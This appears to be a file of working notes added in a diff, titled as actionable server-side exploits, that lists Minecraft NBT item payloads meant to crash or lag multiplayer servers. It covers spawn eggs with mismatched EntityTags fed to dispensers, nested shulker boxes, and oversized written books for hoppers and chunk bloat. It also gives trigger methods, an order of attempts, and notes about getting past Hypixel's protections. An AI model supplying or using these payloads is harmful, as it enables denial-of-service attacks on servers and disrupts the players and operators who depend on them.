@@ -1,0 +1,151 @@
+TNBT - ACTIONABLE SERVER-SIDE EXPLOITS (Jan 2026)
+==================================================
+
+FOCUS: Specific NBT payloads + HOW to trigger them
+
+
+=== SPAWN EGG + DISPENSER CRASH (Confirmed 2019-2020) ===
+
+TRIGGER: Put in dispenser, activate with redstone
+
+This crashes servers - spawn egg with EntityTag pointing to wrong entity type:
+
+minecraft:spawn_egg 1 90 {EntityTag:{id:"minecraft:painting"}}
+
+When dispensed, server tries to spawn pig (90) but EntityTag says painting.
+Causes "Saving entity NBT" error -> SERVER CRASH
+
+Other entity mismatches to try:
+minecraft:spawn_egg 1 90 {EntityTag:{id:"minecraft:item_frame"}}
+minecraft:spawn_egg 1 90 {EntityTag:{id:"minecraft:falling_block"}}
+minecraft:spawn_egg 1 90 {EntityTag:{id:"minecraft:armor_stand"}}
+minecraft:spawn_egg 1 50 {EntityTag:{id:"minecraft:ender_crystal"}}
+
+
+=== SHULKER BOX RECURSION CRASH ===
+
+TRIGGER: Copy container with NBT into itself
+
+Bug MC-xxxxxx: Copying containers with NBT data into themselves
+causes "intense server-side lag and eventual crash"
+
+Method:
+1. Get shulker box with items
+2. Use NBT editor to copy entire shulker into one of its own slots
+3. Repeat until deeply nested
+4. Place shulker box in world
+
+minecraft:purple_shulker_box 1 0 {BlockEntityTag:{Items:[{Slot:0b,id:"minecraft:purple_shulker_box",Count:1b,tag:{BlockEntityTag:{Items:[{Slot:0b,id:"minecraft:purple_shulker_box",Count:1b,tag:{BlockEntityTag:{Items:[]}}}]}}}]}}
+
+
+=== HOPPER + MASSIVE NBT ITEM ===
+
+TRIGGER: Hopper tries to move item with huge NBT
+
+When hoppers move items, they serialize/deserialize NBT each tick.
+Item with huge NBT = massive CPU load per tick.
+
+Put in hopper chain:
+minecraft:written_book 1 0 {title:"X",author:"Y",pages:["{\"text\":\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"}","{\"text\":\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"}","{\"text\":\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"}"]}
+
+
+=== CHUNK SAVE EXPLOIT ===
+
+TRIGGER: Place items in chest until chunk NBT exceeds limit
+
+Chunk has 1MB hard cap. Exceeding = chunk fails to save = rollback.
+
+Fill chest with NBT-heavy items:
+- Written books with max pages
+- Maps with decorations
+- Enchanted items with long lore
+
+When chunk fails to save, server may crash or rollback.
+
+
+=== DISPENSER + INVALID BLOCK PLACEMENT ===
+
+TRIGGER: Dispenser places block that can't exist
+
+Historical (1.8-1.8.5): Dispensers could place command blocks with NBT.
+This bypassed OP permissions.
+
+Try: Dispenser with blocks that have invalid block states:
+minecraft:dispenser 1 0 {Items:[{Slot:0b,id:"minecraft:bed",Count:1b,Damage:15s}]}
+
+
+=== TILE ENTITY OVERLOAD ===
+
+TRIGGER: Too many tile entities in one chunk
+
+Each sign, chest, hopper = tile entity with NBT checked every tick.
+Fill chunk with:
+- 256 signs with long text
+- Hoppers in a grid
+- Chests with items
+
+Server tick time increases until timeout.
+
+
+=== SPECIFIC NBT PAYLOADS ===
+
+--- DISPENSER SERVER CRASH (put egg in dispenser, power it) ---
+
+minecraft:spawn_egg 1 90 {EntityTag:{id:"minecraft:painting"},display:{Name:"§c§lCRASH EGG"}}
+
+minecraft:spawn_egg 1 50 {EntityTag:{id:"minecraft:falling_block",TileEntityData:{Command:"/stop"}},display:{Name:"§4§lFALLING CRASH"}}
+
+
+--- HOPPER LAG (put in hopper, let it cycle) ---
+
+minecraft:written_book 1 0 {title:"LAG",author:"X",resolved:1b,pages:["{\"text\":\"A\"}","{\"text\":\"A\"}","{\"text\":\"A\"}","{\"text\":\"A\"}","{\"text\":\"A\"}","{\"text\":\"A\"}","{\"text\":\"A\"}","{\"text\":\"A\"}","{\"text\":\"A\"}","{\"text\":\"A\"}","{\"text\":\"A\"}","{\"text\":\"A\"}","{\"text\":\"A\"}","{\"text\":\"A\"}","{\"text\":\"A\"}","{\"text\":\"A\"}","{\"text\":\"A\"}","{\"text\":\"A\"}","{\"text\":\"A\"}","{\"text\":\"A\"}","{\"text\":\"A\"}","{\"text\":\"A\"}","{\"text\":\"A\"}","{\"text\":\"A\"}","{\"text\":\"A\"}","{\"text\":\"A\"}","{\"text\":\"A\"}","{\"text\":\"A\"}","{\"text\":\"A\"}","{\"text\":\"A\"}","{\"text\":\"A\"}","{\"text\":\"A\"}","{\"text\":\"A\"}","{\"text\":\"A\"}","{\"text\":\"A\"}","{\"text\":\"A\"}","{\"text\":\"A\"}","{\"text\":\"A\"}","{\"text\":\"A\"}","{\"text\":\"A\"}","{\"text\":\"A\"}","{\"text\":\"A\"}","{\"text\":\"A\"}","{\"text\":\"A\"}","{\"text\":\"A\"}","{\"text\":\"A\"}","{\"text\":\"A\"}","{\"text\":\"A\"}","{\"text\":\"A\"}","{\"text\":\"A\"}"]}
+
+
+--- CHEST CHUNK BLOAT (fill chest with these) ---
+
+minecraft:written_book 64 0 {title:"BLOAT",author:"X",resolved:1b,pages:["{\"text\":\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"}","{\"text\":\"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\"}","{\"text\":\"CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC\"}"]}
+
+
+--- DROP ON GROUND (item entity with huge NBT) ---
+
+Drop this item on ground, let entity tick:
+minecraft:diamond 1 0 {display:{Name:"§c§l§n§o§k§mAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",Lore:["§71","§72","§73","§74","§75","§76","§77","§78","§79","§710","§711","§712","§713","§714","§715","§716","§717","§718","§719","§720","§721","§722","§723","§724","§725","§726","§727","§728","§729","§730"]}}
+
+
+=== TRIGGER METHODS ===
+
+1. DISPENSER: Place egg/item, power with redstone
+   - Server processes EntityTag/NBT when item is dispensed
+   
+2. HOPPER: Place item in hopper chain
+   - Every tick, hopper serializes item NBT
+   
+3. CHEST/CONTAINER: Fill with NBT items
+   - Chunk save bloat = potential crash
+   
+4. DROP ON GROUND: Throw item
+   - Item entity ticks with NBT data
+   
+5. PICKUP: Walk over dropped item
+   - Player inventory serialization
+   
+6. SPAWNER: Place egg in spawner (if allowed)
+   - EntityTag processed on spawn attempt
+
+
+=== WHAT TO TRY IN ORDER ===
+
+1. Spawn egg + painting EntityTag -> dispenser
+2. Written books with many pages -> hopper chain
+3. Fill chest with NBT books -> force chunk save
+4. Nested shulker boxes -> place in world
+5. Many signs with text -> same chunk
+
+
+=== NOTES ===
+
+- Hypixel likely has protections for most of these
+- EntityTag manipulation is often blocked
+- But combinations + edge cases may slip through
+- ViaVersion adds translation overhead to each item
+- Housing runs on shared infrastructure
